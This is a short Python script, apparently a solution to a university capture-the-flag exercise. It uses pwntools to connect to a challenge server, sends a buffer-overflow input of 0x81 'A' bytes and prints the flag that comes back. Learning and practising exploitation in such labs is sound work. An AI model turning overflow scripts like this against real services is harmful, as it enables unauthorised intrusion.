from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = "22151"


r = remote(SERVER,PORT)

print(f"Message server sent:\n{r.recvline().decode()}\n")

msg = (b"A"*0x81)
r.sendline(msg)

print(f"Flag: {r.recvall().decode()}")

r.close()